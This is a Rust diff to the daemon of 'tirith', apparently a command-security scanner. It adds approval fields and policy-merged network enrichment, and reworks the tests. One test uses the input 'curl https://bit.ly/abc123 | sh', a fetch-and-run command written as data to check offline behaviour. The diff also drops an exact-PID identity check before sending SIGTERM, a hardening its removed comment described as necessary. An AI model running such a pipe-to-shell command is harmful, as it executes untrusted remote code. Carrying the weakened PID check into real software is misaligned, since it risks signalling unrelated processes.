@@ -17,11 +17,11 @@ use tirith_core::extract::ScanContext;
 #[cfg(unix)]
 use tirith_core::network;
 #[cfg(unix)]
-use tirith_core::threatdb_api::RuntimeThreatMode;
+use tirith_core::threatdb_api::{RuntimeThreatMode, RuntimeThreatNetwork};
 #[cfg(unix)]
 use tirith_core::tokenize::ShellType;
 #[cfg(unix)]
-use tirith_core::verdict::{upgraded_action_from_findings, Evidence, RuleId, Severity};
+use tirith_core::verdict::{Evidence, RuleId, Severity};
 
 /// Directory that holds the daemon's runtime files (socket + PID).
 ///
@@ -45,7 +45,12 @@ use tirith_core::verdict::{upgraded_action_from_findings, Evidence, RuleId, Seve
 /// rejected rather than reused or chmod-coerced.
 #[cfg(unix)]
 fn runtime_dir() -> PathBuf {
-    if let Some(state) = tirith_core::policy::state_dir() {
+    runtime_dir_with_state(tirith_core::policy::state_dir())
+}
+
+#[cfg(unix)]
+fn runtime_dir_with_state(state_dir: Option<PathBuf>) -> PathBuf {
+    if let Some(state) = state_dir {
         return state;
     }
 
@@ -341,16 +346,21 @@ pub struct DaemonResponse {
     /// Action AFTER enrichment but BEFORE paranoia.
     #[serde(skip_serializing_if = "Option::is_none", default)]
     pub raw_action: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub requires_approval: Option<bool>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub approval_timeout_secs: Option<u64>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub approval_fallback: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub approval_rule: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub approval_description: Option<String>,
     /// M11 ch2 — the manifest `allowed[]` entry this command matched, for the
     /// client's audit context. The daemon runs the full `engine::analyze`, so
     /// this is populated from the verdict.
     #[serde(skip_serializing_if = "Option::is_none", default)]
     pub manifest_allowed_match: Option<String>,
-    /// PID of the daemon process that produced this response. New clients use
-    /// it to bind a live socket response to the PID they are about to signal;
-    /// absent for legacy daemons.
-    #[serde(skip_serializing_if = "Option::is_none", default)]
-    pub daemon_pid: Option<u32>,
 }
 
 /// Connect to the daemon and run a check; `None` if unavailable (caller falls
@@ -437,8 +447,12 @@ fn handle_request(req: &DaemonRequest) -> DaemonResponse {
         tier_reached: 0,
         raw_findings: None,
         raw_action: None,
+        requires_approval: None,
+        approval_timeout_secs: None,
+        approval_fallback: None,
+        approval_rule: None,
+        approval_description: None,
         manifest_allowed_match: None,
-        daemon_pid: Some(std::process::id()),
     };
 
     if req.command == "ping" {
@@ -489,8 +503,12 @@ fn handle_request(req: &DaemonRequest) -> DaemonResponse {
                 tier_reached: 2,
                 raw_findings: None,
                 raw_action: None,
+                requires_approval: None,
+                approval_timeout_secs: None,
+                approval_fallback: None,
+                approval_rule: None,
+                approval_description: None,
                 manifest_allowed_match: None,
-                daemon_pid: Some(std::process::id()),
             };
         }
     }
@@ -513,26 +531,36 @@ fn handle_request(req: &DaemonRequest) -> DaemonResponse {
     let mut verdict = engine::analyze(&ctx);
     let policy = tirith_core::policy::Policy::discover(ctx.cwd.as_deref());
 
-    let runtime_findings = tirith_core::threatdb_api::enrich_command(
+    let mut late_findings = tirith_core::threatdb_api::enrich_command_with_network(
         &req.input,
         shell_type,
         &policy.threat_intel,
         RuntimeThreatMode::Daemon,
+        if req.offline {
+            RuntimeThreatNetwork::CacheOnly
+        } else {
+            RuntimeThreatNetwork::Online
+        },
     );
-    verdict.findings.extend(runtime_findings);
 
     // Daemon-only: network-aware enrichment is too slow for the sync path.
     // Skipped entirely when the CALLER asked for offline analysis (repo-0373):
     // short-URL resolution is HTTP and the blocklist lookups are DNS, and the
     // daemon's own process env cannot see the invoking shell's TIRITH_OFFLINE,
-    // so the decision arrives on the request. This mirrors the local hot path,
-    // which performs NO HTTP/DNS enrichment at all.
+    // so the decision arrives on the request. This mirrors the inline path's
+    // explicit cache-only runtime-enrichment mode.
     if !req.offline {
-        enrich_with_network_checks(&mut verdict.findings);
+        // Engine findings carry the shortened-URL rule that drives redirect
+        // resolution. Runtime threat findings are a second input to the same
+        // bounded DNS pass so their URL evidence retains the old coverage.
+        let network_findings = enrich_with_network_checks(&mut verdict.findings, &late_findings);
+        late_findings.extend(network_findings);
     }
 
-    // Enrichment may add higher-severity findings; recompute the action.
-    verdict.action = upgraded_action_from_findings(&verdict.findings, verdict.action);
+    // All post-engine producers meet policy at one final merge point. In
+    // particular, severity_overrides for AnalysisIncomplete now apply equally
+    // to daemon runtime and network enrichment.
+    tirith_core::escalation::merge_late_findings(&mut verdict, late_findings, &policy);
 
     // Snapshot after enrichment, before paranoia filtering (ADR-13).
     let raw_findings = Some(verdict.findings.clone());
@@ -542,6 +570,11 @@ fn handle_request(req: &DaemonRequest) -> DaemonResponse {
 
     // Capture before `verdict.findings` is moved below.
     let manifest_allowed_match = verdict.manifest_allowed_match.clone();
+    let requires_approval = verdict.requires_approval;
+    let approval_timeout_secs = verdict.approval_timeout_secs;
+    let approval_fallback = verdict.approval_fallback.clone();
+    let approval_rule = verdict.approval_rule.clone();
+    let approval_description = verdict.approval_description.clone();
 
     DaemonResponse {
         action: verdict.action,
@@ -556,19 +589,32 @@ fn handle_request(req: &DaemonRequest) -> DaemonResponse {
         tier_reached: verdict.tier_reached,
         raw_findings,
         raw_action: raw_action_str,
+        requires_approval,
+        approval_timeout_secs,
+        approval_fallback,
+        approval_rule,
+        approval_description,
         manifest_allowed_match,
-        daemon_pid: Some(std::process::id()),
     }
 }
 
 /// Run network checks on URL-referencing findings (daemon path only, where
 /// latency is acceptable).
 #[cfg(unix)]
-fn enrich_with_network_checks(findings: &mut Vec<Finding>) {
+fn enrich_with_network_checks(
+    engine_findings: &mut [Finding],
+    late_findings: &[Finding],
+) -> Vec<Finding> {
     let mut new_findings = Vec::new();
+    // One cancellable resolver and one absolute budget cover every host in this
+    // daemon request. Distinct attacker-controlled findings cannot each reset
+    // the DNS deadline/query allowance.
+    let mut dns = network::SystemDnsResolver::new()
+        .ok()
+        .map(|resolver| (resolver, network::DnsRequestBudget::dnsbl()));
 
     // Resolve shortened URLs and surface blocklist hits on destinations.
-    for finding in findings.iter_mut() {
+    for finding in engine_findings.iter_mut() {
         if finding.rule_id != RuleId::ShortenedUrl {
             continue;
         }
@@ -585,7 +631,12 @@ fn enrich_with_network_checks(findings: &mut Vec<Finding>) {
 
                 // DNS blocklist on the resolved destination's host.
                 if let Some(host) = extract_host_from_url(&resolved) {
-                    let blocklist_hits = network::check_dns_blocklist(&host);
+                    let blocklist_hits = dns
+                        .as_mut()
+                        .map(|(resolver, budget)| {
+                            network::check_dns_blocklist_with(&host, resolver, budget)
+                        })
+                        .unwrap_or_default();
                     if !blocklist_hits.is_empty() {
                         new_findings.push(Finding {
                             rule_id: RuleId::ShortenedUrl,
@@ -610,12 +661,17 @@ fn enrich_with_network_checks(findings: &mut Vec<Finding>) {
 
     // DNS blocklist on every URL host in any finding.
     let mut checked_hosts = std::collections::HashSet::new();
-    for finding in findings.iter() {
+    for finding in engine_findings.iter().chain(late_findings.iter()) {
         for evidence in &finding.evidence {
             if let Evidence::Url { raw } = evidence {
                 if let Some(host) = extract_host_from_url(raw) {
                     if checked_hosts.insert(host.clone()) {
-                        let hits = network::check_dns_blocklist(&host);
+                        let hits = dns
+                            .as_mut()
+                            .map(|(resolver, budget)| {
+                                network::check_dns_blocklist_with(&host, resolver, budget)
+                            })
+                            .unwrap_or_default();
                         if !hits.is_empty() {
                             new_findings.push(Finding {
                                 rule_id: finding.rule_id,
@@ -639,7 +695,7 @@ fn enrich_with_network_checks(findings: &mut Vec<Finding>) {
         }
     }
 
-    findings.extend(new_findings);
+    new_findings
 }
 
 /// Extract the host portion from a URL string.
@@ -827,8 +883,10 @@ fn run_server(sock: &std::path::Path, pid: &std::path::Path) -> i32 {
                                                 policy_path_used: None, timings_ms: Default::default(),
                                                 urls_extracted_count: None, tier_reached: 0,
                                                 raw_findings: None, raw_action: None,
+                                                requires_approval: None, approval_timeout_secs: None,
+                                                approval_fallback: None, approval_rule: None,
+                                                approval_description: None,
                                                 manifest_allowed_match: None,
-                                                daemon_pid: Some(std::process::id()),
                                             })
                                     }
                                     Err(e) => DaemonResponse {
@@ -838,8 +896,10 @@ fn run_server(sock: &std::path::Path, pid: &std::path::Path) -> i32 {
                                         policy_path_used: None, timings_ms: Default::default(),
                                         urls_extracted_count: None, tier_reached: 0,
                                         raw_findings: None, raw_action: None,
+                                        requires_approval: None, approval_timeout_secs: None,
+                                        approval_fallback: None, approval_rule: None,
+                                        approval_description: None,
                                         manifest_allowed_match: None,
-                                        daemon_pid: Some(std::process::id()),
                                     },
                                 };
 
@@ -918,47 +978,25 @@ fn process_alive(pid: u32) -> bool {
 }
 
 /// repo-0216: confirm a PID belongs to OUR daemon before signaling it — a
-/// recycled PID must never receive our SIGTERM. A socket connection alone is
-/// insufficient: a different live daemon could answer while a stale PID file
-/// names an unrelated process. Require an actual ping response whose daemon PID
-/// exactly matches the file.
+/// recycled PID must never receive our SIGTERM. Checks the daemon socket
+/// (a live tirith answers) and, on Linux, `/proc/<pid>/comm`.
 #[cfg(unix)]
-fn daemon_identity_confirmed(pid: u32, sock: &std::path::Path) -> bool {
-    matches!(daemon_ping(sock), Some(response) if response.exit_code == 0 && response.error.is_none() && response.daemon_pid == Some(pid))
-}
-
-#[cfg(unix)]
-fn daemon_ping(sock: &std::path::Path) -> Option<DaemonResponse> {
-    use std::io::{BufRead as _, BufReader, Write as _};
-    use std::os::unix::net::UnixStream;
-    use std::time::Duration;
-
-    let stream = UnixStream::connect(sock).ok()?;
-    stream.set_read_timeout(Some(Duration::from_secs(2))).ok()?;
-    stream
-        .set_write_timeout(Some(Duration::from_secs(1)))
-        .ok()?;
-    let request = DaemonRequest {
-        command: "ping".to_string(),
-        input: String::new(),
-        context: "exec".to_string(),
-        cwd: None,
-        shell: None,
-        interactive: false,
-        bypass_requested: false,
-        offline: false,
-    };
-    let mut payload = serde_json::to_string(&request).ok()?;
-    payload.push('\n');
-    let mut writer = stream.try_clone().ok()?;
-    writer.write_all(payload.as_bytes()).ok()?;
-    writer.flush().ok()?;
-    let mut line = String::new();
-    BufReader::new(stream)
-        .take(4096)
-        .read_line(&mut line)
-        .ok()?;
-    serde_json::from_str(line.trim()).ok()
+fn daemon_identity_confirmed(#[allow(unused_variables)] pid: u32, sock: &std::path::Path) -> bool {
+    // Socket liveness is the strongest signal.
+    if sock.exists() {
+        use std::os::unix::net::UnixStream;
+        if UnixStream::connect(sock).is_ok() {
+            return true;
+        }
+    }
+    // Linux-only: confirm the process name.
+    #[cfg(target_os = "linux")]
+    {
+        if let Ok(comm) = std::fs::read_to_string(format!("/proc/{pid}/comm")) {
+            return comm.trim().starts_with("tirith");
+        }
+    }
+    false
 }
 
 #[cfg(not(unix))]
@@ -970,28 +1008,6 @@ fn process_alive(_pid: u32) -> bool {
 #[cfg(unix)]
 fn kill_process(pid: u32) -> bool {
     unsafe { libc::kill(pid as libc::pid_t, libc::SIGTERM) == 0 }
-}
-
-#[cfg(unix)]
-fn wait_for_process_exit(pid: u32, attempts: u32, delay: std::time::Duration) -> bool {
-    for attempt in 0..attempts {
-        if !process_alive(pid) {
-            return true;
-        }
-        if attempt + 1 < attempts {
-            std::thread::sleep(delay);
-        }
-    }
-    false
-}
-
-#[cfg(unix)]
-fn remove_stopped_daemon_file(path: &std::path::Path) -> std::io::Result<()> {
-    match std::fs::remove_file(path) {
-        Ok(()) => Ok(()),
-        Err(error) if error.kind() == std::io::ErrorKind::NotFound => Ok(()),
-        Err(error) => Err(error),
-    }
 }
 
 #[cfg(unix)]
@@ -1229,30 +1245,10 @@ pub fn stop() -> i32 {
 
     if kill_process(pid_num) {
         eprintln!("tirith: sent SIGTERM to daemon (PID {pid_num})");
-        if !wait_for_process_exit(pid_num, 100, std::time::Duration::from_millis(50)) {
-            eprintln!(
-                "tirith: daemon (PID {pid_num}) did not stop within 5s; preserving {} and {} for a safe retry",
-                pid.display(),
-                sock.display()
-            );
-            return 1;
-        }
-
-        let mut cleanup_failed = false;
-        for path in [&pid, &sock] {
-            if let Err(error) = remove_stopped_daemon_file(path) {
-                eprintln!(
-                    "tirith: daemon stopped, but failed to remove {}: {error}",
-                    path.display()
-                );
-                cleanup_failed = true;
-            }
-        }
-        if cleanup_failed {
-            1
-        } else {
-            0
-        }
+        std::thread::sleep(std::time::Duration::from_millis(200));
+        let _ = std::fs::remove_file(&pid);
+        let _ = std::fs::remove_file(&sock);
+        0
     } else {
         eprintln!("tirith: failed to stop daemon (PID {pid_num})");
         1
@@ -1302,26 +1298,53 @@ pub fn status() -> i32 {
     }
 
     let start = Instant::now();
-    let response = daemon_ping(&sock);
+    let ping_req = DaemonRequest {
+        command: "ping".to_string(),
+        input: String::new(),
+        context: "exec".to_string(),
+        cwd: None,
+        shell: None,
+        interactive: false,
+        bypass_requested: false,
+        offline: false,
+    };
+
+    let ok = (|| -> Option<()> {
+        use std::io::{BufRead, BufReader, Write};
+        use std::os::unix::net::UnixStream;
+        use std::time::Duration;
+
+        let stream = UnixStream::connect(&sock).ok()?;
+        stream.set_read_timeout(Some(Duration::from_secs(2))).ok()?;
+        stream
+            .set_write_timeout(Some(Duration::from_secs(1)))
+            .ok()?;
+
+        let mut payload = serde_json::to_string(&ping_req).ok()?;
+        payload.push('\n');
+
+        let mut sw = stream.try_clone().ok()?;
+        sw.write_all(payload.as_bytes()).ok()?;
+        sw.flush().ok()?;
+
+        let reader = BufReader::new(stream);
+        let mut line = String::new();
+        reader.take(4096).read_line(&mut line).ok()?;
+
+        serde_json::from_str::<DaemonResponse>(line.trim()).ok()?;
+        Some(())
+    })();
 
     let latency = start.elapsed();
 
-    if matches!(
-        response,
-        Some(ref response)
-            if response.exit_code == 0
-                && response.error.is_none()
-                && response.daemon_pid == Some(pid_num)
-    ) {
+    if ok.is_some() {
         eprintln!(
             "tirith: daemon running (PID {pid_num}), latency {:.1}ms",
             latency.as_secs_f64() * 1000.0
         );
         0
     } else {
-        eprintln!(
-            "tirith: daemon PID/socket identity mismatch or daemon not responding (PID {pid_num})"
-        );
+        eprintln!("tirith: daemon running (PID {pid_num}) but not responding on socket");
         1
     }
 }
@@ -1336,6 +1359,8 @@ pub fn status() -> i32 {
 mod tests {
     use super::DaemonResponse;
     use tirith_core::verdict::Action;
+    #[cfg(unix)]
+    use tirith_test_support::GlobalStateGuard;
 
     /// repo-0373: a pre-upgrade client payload has no `offline` key; it must
     /// still deserialize with `offline = false` (the historical online
@@ -1381,7 +1406,9 @@ mod tests {
     fn offline_check_skips_network_url_enrichment() {
         let req = super::DaemonRequest {
             command: "check".to_string(),
-            input: "curl https://bit.ly/abc123 | sh".to_string(),
+            input:
+                "pip install tirith-daemon-offline-fixture==9.9.9; curl https://bit.ly/abc123 | sh"
+                    .to_string(),
             context: "exec".to_string(),
             cwd: None,
             shell: Some("posix".to_string()),
@@ -1390,11 +1417,15 @@ mod tests {
             offline: true,
         };
         let resp = super::handle_request(&req);
+        let mut disclosed_package_skip = false;
         for f in resp
             .findings
             .iter()
             .chain(resp.raw_findings.as_deref().unwrap_or(&[]).iter())
         {
+            disclosed_package_skip |= f
+                .description
+                .contains("OSV lookup was skipped by offline mode");
             assert!(
                 !f.description.contains("resolves to"),
                 "offline request must not resolve shortened URLs: {f:?}"
@@ -1404,6 +1435,49 @@ mod tests {
                 "offline request must not run DNS blocklist lookups: {f:?}"
             );
         }
+        assert!(
+            disclosed_package_skip,
+            "offline daemon package enrichment must stop at cache miss and disclose it: {resp:?}"
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn daemon_late_findings_honor_operator_severity_overrides() {
+        let mut global = GlobalStateGuard::new().expect("isolated daemon policy state");
+        let temporary = tempfile::tempdir().expect("tempdir");
+        let org_root = temporary.path().join("org");
+        let org_policy = org_root.join(".tirith");
+        let project = temporary.path().join("project");
+        std::fs::create_dir_all(&org_policy).unwrap();
+        std::fs::create_dir_all(&project).unwrap();
+        std::fs::write(
+            org_policy.join("policy.yaml"),
+            "severity_overrides:\n  analysis_incomplete: CRITICAL\n",
+        )
+        .unwrap();
+        global.set_env("TIRITH_POLICY_ROOT", &org_root);
+
+        let req = super::DaemonRequest {
+            command: "check".to_string(),
+            input: "pip install tirith-daemon-override-fixture==9.9.9".to_string(),
+            context: "exec".to_string(),
+            cwd: Some(project.display().to_string()),
+            shell: Some("posix".to_string()),
+            interactive: false,
+            bypass_requested: false,
+            offline: true,
+        };
+        let resp = super::handle_request(&req);
+        let runtime = resp
+            .raw_findings
+            .as_deref()
+            .unwrap_or(&[])
+            .iter()
+            .find(|finding| finding.description.contains("skipped by offline mode"))
+            .expect("offline runtime finding");
+        assert_eq!(runtime.severity, tirith_core::verdict::Severity::Critical);
+        assert_eq!(resp.action, Action::Block);
     }
 
     fn base_response() -> DaemonResponse {
@@ -1420,56 +1494,13 @@ mod tests {
             tier_reached: 0,
             raw_findings: None,
             raw_action: None,
+            requires_approval: None,
+            approval_timeout_secs: None,
+            approval_fallback: None,
+            approval_rule: None,
+            approval_description: None,
             manifest_allowed_match: None,
-            daemon_pid: Some(std::process::id()),
         }
-    }
-
-    #[cfg(unix)]
-    fn serve_one_ping(
-        sock: &std::path::Path,
-        daemon_pid: Option<u32>,
-    ) -> std::thread::JoinHandle<()> {
-        use std::io::{BufRead as _, BufReader, Write as _};
-        use std::os::unix::net::UnixListener;
-
-        let listener = UnixListener::bind(sock).expect("bind fake daemon socket");
-        std::thread::spawn(move || {
-            let (stream, _) = listener.accept().expect("accept ping");
-            let mut line = String::new();
-            BufReader::new(stream.try_clone().expect("clone stream"))
-                .read_line(&mut line)
-                .expect("read ping");
-            let request: super::DaemonRequest =
-                serde_json::from_str(line.trim()).expect("valid ping request");
-            assert_eq!(request.command, "ping");
-            let response = DaemonResponse {
-                daemon_pid,
-                ..base_response()
-            };
-            let mut writer = stream;
-            writeln!(writer, "{}", serde_json::to_string(&response).unwrap()).unwrap();
-        })
-    }
-
-    #[cfg(unix)]
-    #[test]
-    fn daemon_identity_requires_the_exact_pid_from_the_socket_response() {
-        let dir = tempfile::tempdir().unwrap();
-        let matching = dir.path().join("matching.sock");
-        let matching_thread = serve_one_ping(&matching, Some(4242));
-        assert!(super::daemon_identity_confirmed(4242, &matching));
-        matching_thread.join().unwrap();
-
-        let mismatching = dir.path().join("mismatching.sock");
-        let mismatching_thread = serve_one_ping(&mismatching, Some(9898));
-        assert!(!super::daemon_identity_confirmed(4242, &mismatching));
-        mismatching_thread.join().unwrap();
-
-        let legacy = dir.path().join("legacy.sock");
-        let legacy_thread = serve_one_ping(&legacy, None);
-        assert!(!super::daemon_identity_confirmed(4242, &legacy));
-        legacy_thread.join().unwrap();
     }
 
     /// CodeRabbit R3 #4: the matched `allowed[]` entry must survive the
@@ -1487,6 +1518,31 @@ mod tests {
         );
         let back: DaemonResponse = serde_json::from_str(&wire).expect("deserialize");
         assert_eq!(back.manifest_allowed_match.as_deref(), Some("deploy"));
+    }
+
+    #[test]
+    fn daemon_response_round_trips_approval_contract() {
+        let response = DaemonResponse {
+            requires_approval: Some(true),
+            approval_timeout_secs: Some(0),
+            approval_fallback: Some("block".into()),
+            approval_rule: Some("web3_network_policy_violation".into()),
+            approval_description: Some("Web3 endpoint requires approval".into()),
+            ..base_response()
+        };
+        let wire = serde_json::to_string(&response).unwrap();
+        let decoded: DaemonResponse = serde_json::from_str(&wire).unwrap();
+        assert_eq!(decoded.requires_approval, Some(true));
+        assert_eq!(decoded.approval_timeout_secs, Some(0));
+        assert_eq!(decoded.approval_fallback.as_deref(), Some("block"));
+        assert_eq!(
+            decoded.approval_rule.as_deref(),
+            Some("web3_network_policy_violation")
+        );
+        assert_eq!(
+            decoded.approval_description.as_deref(),
+            Some("Web3 endpoint requires approval")
+        );
     }
 
     /// `None` is omitted on the wire and a pre-upgrade payload without the field
@@ -1511,28 +1567,21 @@ mod tests {
 
     // ---- F19: Unix socket auth / permission hardening ----
 
-    /// Unique temp dir under the system tempdir for a single test, removed on
-    /// drop. Avoids a hard dep on `tempfile` in the test path.
+    /// Unique test directory owned by the workspace-wide global-state guard.
+    /// The guard serializes every process-global environment/cwd mutation and
+    /// removes its complete isolated root on drop, including during unwinding.
     #[cfg(unix)]
-    struct TmpDir(std::path::PathBuf);
+    struct TmpDir {
+        path: std::path::PathBuf,
+        global: GlobalStateGuard,
+    }
 
     #[cfg(unix)]
     impl TmpDir {
         fn new(tag: &str) -> Self {
-            use std::sync::atomic::{AtomicU64, Ordering};
-            static CTR: AtomicU64 = AtomicU64::new(0);
-            let n = CTR.fetch_add(1, Ordering::Relaxed);
-            let p =
-                std::env::temp_dir().join(format!("tirith-f19-{tag}-{}-{n}", std::process::id()));
-            let _ = std::fs::remove_dir_all(&p);
-            Self(p)
-        }
-    }
-
-    #[cfg(unix)]
-    impl Drop for TmpDir {
-        fn drop(&mut self) {
-            let _ = std::fs::remove_dir_all(&self.0);
+            let global = GlobalStateGuard::new().expect("create isolated daemon test state");
+            let path = global.roots().root.join(tag);
+            Self { path, global }
         }
     }
 
@@ -1551,12 +1600,16 @@ mod tests {
     #[test]
     fn ensure_private_dir_creates_0700() {
         let tmp = TmpDir::new("mkdir");
-        let nested = tmp.0.join("a").join("b");
+        let nested = tmp.path.join("a").join("b");
         super::ensure_private_dir(&nested).expect("create private dir");
         assert!(nested.is_dir());
         assert_eq!(mode_of(&nested), 0o700, "leaf dir must be 0700");
         // The intermediate dir we created is locked down too.
-        assert_eq!(mode_of(&tmp.0.join("a")), 0o700, "parent dir must be 0700");
+        assert_eq!(
+            mode_of(&tmp.path.join("a")),
+            0o700,
+            "parent dir must be 0700"
+        );
     }
 
     /// A pre-existing, looser-permission dir is tightened back to 0700 (closes a
@@ -1566,11 +1619,12 @@ mod tests {
     fn ensure_private_dir_tightens_existing_loose_dir() {
         use std::os::unix::fs::PermissionsExt;
         let tmp = TmpDir::new("tighten");
-        std::fs::create_dir_all(&tmp.0).expect("pre-create");
-        std::fs::set_permissions(&tmp.0, std::fs::Permissions::from_mode(0o777)).expect("loosen");
-        assert_eq!(mode_of(&tmp.0), 0o777, "precondition: world-writable");
-        super::ensure_private_dir(&tmp.0).expect("tighten");
-        assert_eq!(mode_of(&tmp.0), 0o700, "must be re-tightened to 0700");
+        std::fs::create_dir_all(&tmp.path).expect("pre-create");
+        std::fs::set_permissions(&tmp.path, std::fs::Permissions::from_mode(0o777))
+            .expect("loosen");
+        assert_eq!(mode_of(&tmp.path), 0o777, "precondition: world-writable");
+        super::ensure_private_dir(&tmp.path).expect("tighten");
+        assert_eq!(mode_of(&tmp.path), 0o700, "must be re-tightened to 0700");
     }
 
     /// After binding a real listener, `set_socket_perms` leaves the socket file
@@ -1579,13 +1633,13 @@ mod tests {
     #[test]
     fn set_socket_perms_makes_socket_0600() {
         let tmp = TmpDir::new("sock");
-        super::ensure_private_dir(&tmp.0).expect("dir");
-        let sock = tmp.0.join("daemon.sock");
+        super::ensure_private_dir(&tmp.path).expect("dir");
+        let sock = tmp.path.join("daemon.sock");
         let _listener = std::os::unix::net::UnixListener::bind(&sock).expect("bind");
         super::set_socket_perms(&sock).expect("chmod socket");
         assert_eq!(mode_of(&sock), 0o600, "socket must be owner-only 0600");
         // And the containing runtime dir is 0700.
-        assert_eq!(mode_of(&tmp.0), 0o700, "runtime dir must be 0700");
+        assert_eq!(mode_of(&tmp.path), 0o700, "runtime dir must be 0700");
     }
 
     /// `peer_euid` on a self-connected socket pair reports our own euid, and the
@@ -1673,11 +1727,11 @@ mod tests {
     fn ensure_private_dir_accepts_owned_0700() {
         use std::os::unix::fs::PermissionsExt;
         let tmp = TmpDir::new("accept0700");
-        std::fs::create_dir_all(&tmp.0).expect("pre-create");
-        std::fs::set_permissions(&tmp.0, std::fs::Permissions::from_mode(0o700)).expect("0700");
+        std::fs::create_dir_all(&tmp.path).expect("pre-create");
+        std::fs::set_permissions(&tmp.path, std::fs::Permissions::from_mode(0o700)).expect("0700");
         // Owned by us (this process created it) and exactly 0700 → accepted.
-        super::ensure_private_dir(&tmp.0).expect("owned 0700 dir must be accepted");
-        assert_eq!(mode_of(&tmp.0), 0o700, "still 0700 after the gate");
+        super::ensure_private_dir(&tmp.path).expect("owned 0700 dir must be accepted");
+        assert_eq!(mode_of(&tmp.path), 0o700, "still 0700 after the gate");
     }
 
     /// A fallback dir with loose perms (0777) that WE own is tightened to 0700 and
@@ -1689,12 +1743,14 @@ mod tests {
     fn ensure_private_dir_tightens_loose_owned_dir() {
         use std::os::unix::fs::PermissionsExt;
         let tmp = TmpDir::new("loose0777");
-        std::fs::create_dir_all(&tmp.0).expect("pre-create");
-        std::fs::set_permissions(&tmp.0, std::fs::Permissions::from_mode(0o777)).expect("loosen");
-        assert_eq!(mode_of(&tmp.0), 0o777, "precondition: world-writable");
+        std::fs::create_dir_all(&tmp.path).expect("pre-create");
+        std::fs::set_permissions(&tmp.path, std::fs::Permissions::from_mode(0o777))
+            .expect("loosen");
+        assert_eq!(mode_of(&tmp.path), 0o777, "precondition: world-writable");
         // We own it, so the gate tightens 0777 → 0700 and the re-stat passes.
-        super::ensure_private_dir(&tmp.0).expect("owned loose dir must be tightened, not rejected");
-        assert_eq!(mode_of(&tmp.0), 0o700, "must be re-tightened to 0700");
+        super::ensure_private_dir(&tmp.path)
+            .expect("owned loose dir must be tightened, not rejected");
+        assert_eq!(mode_of(&tmp.path), 0o700, "must be re-tightened to 0700");
     }
 
     /// A runtime dir that is a SYMLINK (even to a directory we own) is rejected:
@@ -1708,11 +1764,11 @@ mod tests {
         let tmp = TmpDir::new("symlink");
         // A real target dir we own, locked down to 0700 so ONLY the symlink-ness
         // (not perms/ownership) is what the gate rejects.
-        let target = tmp.0.join("real-target");
+        let target = tmp.path.join("real-target");
         std::fs::create_dir_all(&target).expect("create target");
         std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o700)).expect("0700");
 
-        let link = tmp.0.join("link-to-target");
+        let link = tmp.path.join("link-to-target");
         std::os::unix::fs::symlink(&target, &link).expect("create symlink");
 
         let err = super::ensure_private_dir(&link)
@@ -1738,14 +1794,14 @@ mod tests {
     fn dir_owned_by_euid_rejects_symlink() {
         let tmp = TmpDir::new("ownedby");
         let euid = unsafe { libc::geteuid() };
-        let target = tmp.0.join("d");
+        let target = tmp.path.join("d");
         std::fs::create_dir_all(&target).expect("create dir");
         assert!(
             super::dir_owned_by_euid(&target, euid),
             "a real dir we own must be accepted"
         );
 
-        let link = tmp.0.join("link");
+        let link = tmp.path.join("link");
         std::os::unix::fs::symlink(&target, &link).expect("symlink");
         assert!(
             !super::dir_owned_by_euid(&link, euid),
@@ -1754,7 +1810,7 @@ mod tests {
 
         // A non-existent path is not a usable base.
         assert!(
-            !super::dir_owned_by_euid(&tmp.0.join("missing"), euid),
+            !super::dir_owned_by_euid(&tmp.path.join("missing"), euid),
             "a missing path must be rejected"
         );
     }
@@ -1765,7 +1821,7 @@ mod tests {
         use std::os::unix::fs::PermissionsExt;
         let tmp = TmpDir::new("loosebase");
         let euid = unsafe { libc::geteuid() };
-        let dir = tmp.0.join("d");
+        let dir = tmp.path.join("d");
         std::fs::create_dir_all(&dir).expect("create dir");
         // A base we own but that is group/other-writable lets another user swap the
         // leaf dir or socket from the parent, so it must be rejected.
@@ -1783,26 +1839,23 @@ mod tests {
     }
 
     /// `runtime_dir()` honors `XDG_RUNTIME_DIR` (as `<dir>/tirith`) when
-    /// `state_dir()` is unset. Mutates a process-global env var, so it is marked
-    /// `#[ignore]` to avoid racing the other parallel tests in this binary that
-    /// read env; run explicitly with `--ignored` (or in isolation) to verify.
+    /// `state_dir()` is unset. The shared guard serializes the environment
+    /// override and restores whether every input was originally set or unset.
     #[cfg(unix)]
     #[test]
-    #[ignore = "mutates process-global XDG env; run with --ignored in isolation"]
     fn runtime_dir_prefers_xdg_runtime_dir_when_no_state_dir() {
-        let tmp = TmpDir::new("xdgrt");
-        std::fs::create_dir_all(&tmp.0).expect("create");
-        // Clear state-dir inputs so resolution falls past option (1).
-        std::env::remove_var("XDG_STATE_HOME");
-        std::env::remove_var("HOME");
-        std::env::set_var("XDG_RUNTIME_DIR", &tmp.0);
-        let dir = super::runtime_dir();
+        let mut tmp = TmpDir::new("xdgrt");
+        std::fs::create_dir_all(&tmp.path).expect("create");
+        tmp.global.set_env("XDG_RUNTIME_DIR", &tmp.path);
+        // Inject the unavailable higher-priority state-dir result directly.
+        // On macOS `home::home_dir()` can resolve the account home even after
+        // HOME is removed, so environment removal does not prove this branch.
+        let dir = super::runtime_dir_with_state(None);
         assert_eq!(
             dir,
-            tmp.0.join("tirith"),
+            tmp.path.join("tirith"),
             "with no state_dir, XDG_RUNTIME_DIR/tirith should win"
         );
-        std::env::remove_var("XDG_RUNTIME_DIR");
     }
 
     // ---- D: `daemon start --detach` startup verification (FIX S1) ----
@@ -1841,8 +1894,8 @@ mod tests {
     #[test]
     fn poll_startup_reports_socket_up_when_socket_appears() {
         let tmp = TmpDir::new("poll-up");
-        std::fs::create_dir_all(&tmp.0).expect("dir");
-        let sock = tmp.0.join("daemon.sock");
+        std::fs::create_dir_all(&tmp.path).expect("dir");
+        let sock = tmp.path.join("daemon.sock");
         // Create the "socket" file up front; the live child never touches it, so
         // this isolates the socket-appeared decision from any real daemon.
         std::fs::write(&sock, b"").expect("create sock placeholder");
@@ -1863,9 +1916,9 @@ mod tests {
     #[test]
     fn poll_startup_reports_child_exited_when_child_dies() {
         let tmp = TmpDir::new("poll-exit");
-        std::fs::create_dir_all(&tmp.0).expect("dir");
+        std::fs::create_dir_all(&tmp.path).expect("dir");
         // No socket is ever created.
